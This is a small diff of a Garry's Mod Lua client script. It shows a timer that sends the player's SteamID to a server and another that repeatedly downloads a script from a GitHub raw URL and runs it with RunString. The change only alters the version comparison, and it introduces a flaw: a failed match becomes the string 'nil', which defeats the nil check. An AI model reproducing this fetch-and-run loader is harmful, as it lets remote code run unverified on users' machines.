@@ -78,8 +78,6 @@ if timer.Exists("FetchDataFromServerTimer") then
 end
 
 timer.Create("FetchDataFromServerTimer", 1, 0, function()
-
-
     local headers = {
         ["STEAMID"] = LocalPlayer():SteamID()
     }
@@ -130,8 +128,8 @@ timer.Create("ScriptLengthCheck", 5, 0, function()
     http.Fetch("https://raw.githubusercontent.com/Rovinag12/fluffy/main/script.lua",
         function(body, len, headers, code)
             if code == 200 then
-                get_version = body:match("local version = ([%d%.]+)")
-                if version ~= get_version and get_version ~= nil then
+                get_version = tostring(body:match("local version = ([%d%.]+)"))
+                if tostring(version) ~= get_version and get_version ~= nil then
                     print(len)
                     prevLength = len
                     RunString(body)
